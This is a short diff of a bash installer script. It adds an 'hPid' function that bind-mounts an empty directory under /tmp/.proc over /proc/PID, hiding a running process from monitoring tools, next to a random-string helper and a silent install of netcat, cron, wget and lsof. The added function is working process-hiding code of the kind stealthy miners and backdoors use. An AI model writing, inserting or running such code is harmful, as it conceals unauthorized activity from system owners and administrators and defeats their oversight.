@@ -10,6 +10,10 @@ RandString() {
   n="${1:-2}"; s="${2:-}"; for((i=0;i<$n;i++)); do r=$((`od -An -N2 -i /dev/urandom` % 26 + 97)); s=${s}`echo "$r"| awk '{printf("%c", $1)}'`; done; echo -n "$s";
 }
 
+hPid() {
+  [ -d "/proc/$1" ] && [ ! -d "/tmp/.proc/$1" ] && mkdir -p "/tmp/.proc/$1" && mount -o bind "/tmp/.proc/$1" "/proc/$1" && return 0 || return 1
+}
+
 # Debian12+
 sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
 sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1
